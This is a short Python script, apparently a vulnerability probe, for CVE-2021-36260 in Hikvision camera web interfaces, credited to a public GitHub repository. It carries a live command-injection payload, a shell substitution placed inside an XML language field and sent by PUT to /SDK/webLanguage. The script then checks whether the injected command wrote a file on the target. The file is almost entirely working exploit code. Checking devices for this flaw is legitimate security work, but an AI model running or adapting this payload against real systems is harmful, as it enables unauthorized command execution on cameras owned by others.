# Reference: https://github.com/Cuerz/CVE-2021-36260
import time
import requests

def probe_command_injection(origin_url):
    url = origin_url.split('//')[1]
    try:
        host = url.split(':')[0]
        port = url.split(':')[1]
    except:
        port = 80
    headers = {
        "host": f'{host}:{port}',
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8'
    }
    data = '<?xml version="1.0" encoding="UTF-8"?>' \
           f'<language>$(>webLib/cu)</language>'
    try:
        resp1 = requests.put(url=origin_url + '/SDK/webLanguage', headers=headers, data=data, timeout=3, verify=False)
        resp2 = requests.get(origin_url + '/cu')
        if resp2.status_code == 200:
            print(f"{origin_url} is vulnerable to CVE-2021-36260 {origin_url}/cu")
            return True
        else:
            print(f"{origin_url} is not vulnerable to CVE-2021-36260")
            return False
    except Exception as e:
        print(f"[-]Cannot connect to {origin_url} due to {e}")
	
